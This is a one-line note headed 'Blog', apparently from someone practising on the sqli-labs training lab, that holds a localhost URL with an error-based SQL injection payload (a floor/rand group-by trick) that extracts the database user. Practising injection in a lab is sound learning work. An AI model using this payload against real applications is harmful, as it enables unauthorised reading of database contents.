# Blog
http://localhost/sqli-labs/Less-5/index.php?id=1%27+AND+(select+1+from+(select+count(*),+concat(%27~%27,(select+user()),%27~%27,+floor(rand()*2))as+a+from+information_schema.tables+group+by+a)x)+AND+%27%27=%27
